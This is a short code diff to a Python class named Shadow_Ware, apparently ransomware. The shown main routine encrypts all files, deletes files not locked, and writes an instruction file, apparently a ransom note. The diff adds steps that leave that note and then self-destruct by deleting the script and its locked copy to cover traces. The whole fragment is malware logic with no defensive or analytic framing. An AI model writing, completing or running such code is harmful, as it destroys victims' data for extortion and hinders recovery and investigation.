@@ -98,9 +98,12 @@ class Shadow_Ware():
       file.write(instructions)
 
   def self_destruct(self):
+    os.remove(os.path.abspath("encrypter.py.locked"))
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
   shadow_ware = Shadow_Ware()
   shadow_ware.encrypt_all_files()
   shadow_ware.remove_not_locked_files()
+  shadow_ware.leave_instructions()
+  shadow_ware.self_destruct()
